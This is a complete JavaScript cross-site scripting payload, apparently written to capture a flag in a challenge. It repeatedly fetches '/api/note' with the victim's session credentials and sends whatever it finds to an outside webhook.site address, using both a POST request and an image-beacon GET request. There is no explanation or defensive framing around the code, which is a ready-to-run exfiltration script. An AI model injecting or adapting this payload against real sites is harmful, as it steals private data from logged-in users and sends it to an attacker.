// Robust flag exfil with polling and two transport paths (POST + GET image)
(async () => {
  const SINK = 'https://webhook.site/1211f911-0726-4472-824b-e349f9bbf755';

  const sendPOST = (msg) =>
    fetch(SINK, { method: 'POST', mode: 'no-cors', body: msg });

  const sendGET = (msg) => {
    try {
      const i = new Image();
      // keep under typical URL length limits
      i.src = SINK + '?note=' + encodeURIComponent((msg || '').slice(0, 1800));
    } catch {}
  };

  const send = (msg) => { sendPOST(msg); sendGET(msg); };

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  try {
    send('[XSS start ' + (new Date()).toISOString() + ']');

    // Poll for up to ~90 seconds (360 * 250ms)
    for (let i = 0; i < 360; i++) {
      try {
        const r = await fetch('/api/note', { credentials: 'include' });
        if (!r.ok) { await sleep(250); continue; }
        const data = await r.json().catch(() => ({}));
        const note = (data && data.note) ? String(data.note) : '';

        if (note && note.trim()) {
          send(note);
          return;
        }
      } catch {}
      await sleep(250);
    }

    send('[XSS timeout: note still empty]');
  } catch (e) {
    send('[XSS error]');
  }
})();
